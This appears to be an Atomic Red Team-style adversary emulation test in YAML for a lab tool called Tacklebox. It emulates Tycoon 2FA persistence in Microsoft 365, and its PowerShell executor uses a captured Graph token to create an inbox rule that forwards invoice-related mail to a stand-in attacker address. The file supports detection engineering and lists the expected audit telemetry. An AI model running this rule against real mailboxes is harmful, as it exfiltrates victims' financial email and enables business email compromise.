# LAB TENANT ONLY -- Tacklebox.psm1 enforces at load
attack_technique: T1114.003
display_name: "AiTM – Tycoon 2FA Inbox Rule Persistence for Exfiltration"
_mapping_confidence: medium
_mapping_confidence_rationale: "Microsoft TI attributes inbox forwarding rule creation to Tycoon post-capture operators as persistence mechanism; exact subject-filter keywords and rule naming conventions not stated per-kit."
_citations:
  - claim_type: identity_attack_flows
    source_url: https://www.microsoft.com/en-us/security/blog/2026/03/inside-tycoon2fa-adversary-in-the-middle-phishing-kit/
    quote_or_anchor: "Inside Tycoon2FA -- operators create inbox rules post-capture for persistent mail exfiltration (verify URL slug)"
  - claim_type: entra_telemetry
    source_url: https://learn.microsoft.com/en-us/office/office-365-management-api/office-365-management-activity-api-schema
    quote_or_anchor: "New-InboxRule: Operation='New-InboxRule', RecordType=2 (ExchangeAdmin)"
# Sufficiency: Microsoft TI is tier_1 with identity_attack_flows in grounds -- sufficient alone for medium.

# Promotion target: consolidate into atomics/T1114.003-email-rules-exfil/T1114.003-email-rules-exfil.yaml
#   Add Tycoon variant to atomic_tests[]. Existing entry is generic Graph rule creation;
#   this variant adds Tycoon-specific subject-filter pattern (financial keywords) and
#   requires_token dependency on the T1539/T1550.001 chain.

atomic_tests:
  - name: "Tycoon 2FA variant -- inbox forwarding rule for persistent exfil"
    auto_generated_guid: "00000000-0000-0000-0000-000000000000"  # regenerate at promotion
    description: |
      Emulates Tycoon 2FA operator post-capture persistence: creates a server-side
      inbox rule via Graph API that forwards financial-keyword-matching emails to
      an external address. Inbox rules survive password resets and persist until
      explicitly removed. Typical Tycoon BEC targets: invoice, wire transfer,
      payment, and executive-thread keywords.
    supported_platforms: [windows]
    auth_profile: graph-delegated
    input_arguments:
      token_cache_path:
        description: "Path to a Graph-scoped token cache from T1539 or T1550.001 step."
        type: Path
        default: "#{token_cache_path}"
      target_user_id:
        description: "UPN or object ID of the compromised mailbox."
        type: String
      forwarding_address:
        description: "External address to forward matching mail to (lab-controlled)."
        type: String
        default: "lab-attacker@example.com"
      rule_name:
        description: "Display name for the inbox rule."
        type: String
        default: "Tacklebox-Tycoon-Lab-Rule"
      subject_filter:
        description: "Subject keyword that triggers the rule (Tycoon typically uses financial terms)."
        type: String
        default: "invoice"
    executor:
      name: powershell
      command: |
        # LAB TENANT ONLY -- Tacklebox.psm1 enforces at load
        # wrap-tool: dependencies/manifests/microsoft-graph.json
        Import-Module Microsoft.Graph.Mail -ErrorAction Stop
        $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
        Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

        $ruleBody = @{
            displayName = '#{rule_name}'
            isEnabled   = $true
            sequence    = 1
            conditions  = @{
                subjectContains = @('#{subject_filter}')
            }
            actions = @{
                forwardTo = @(
                    @{
                        emailAddress = @{
                            address = '#{forwarding_address}'
                        }
                    }
                )
                stopProcessingRules = $true
            }
        }
        New-MgUserMailFolderMessageRule `
            -UserId '#{target_user_id}' `
            -MailFolderId 'inbox' `
            -BodyParameter $ruleBody
    cleanup_command: |
      Import-Module Microsoft.Graph.Mail -ErrorAction Stop
      $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
      Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome
      $rules = Get-MgUserMailFolderMessageRule -UserId '#{target_user_id}' -MailFolderId 'inbox'
      $target = $rules | Where-Object { $_.DisplayName -eq '#{rule_name}' }
      if ($target) {
          Remove-MgUserMailFolderMessageRule -UserId '#{target_user_id}' -MailFolderId 'inbox' -MessageRuleId $target.Id -Confirm:$false
      }
    expected_telemetry:
      - source: ual
        within_minutes: 15
        match:
          Operations: "New-InboxRule"
      - source: graph_audit
        within_minutes: 20
        match:
          activityDisplayName: "Add message rule"
    exercises_chokepoint:
      id: CP-TODO
      url: https://iimp0ster.github.io/detection-chokepoints/CP-TODO
